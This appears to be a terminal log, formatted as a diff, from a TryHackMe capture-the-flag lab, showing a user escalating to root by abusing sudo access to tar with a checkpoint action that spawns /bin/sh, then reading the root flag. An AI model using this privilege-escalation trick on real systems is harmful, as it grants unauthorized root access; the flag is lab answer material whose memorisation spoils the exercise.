@@ -1,0 +1,9 @@
+lin@ip-10-66-158-54:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# whoami
+root
+# cd /root
+# ls
+root.txt  snap
+# cat root.txt
+THM{80UN7Y_h4cK3r}
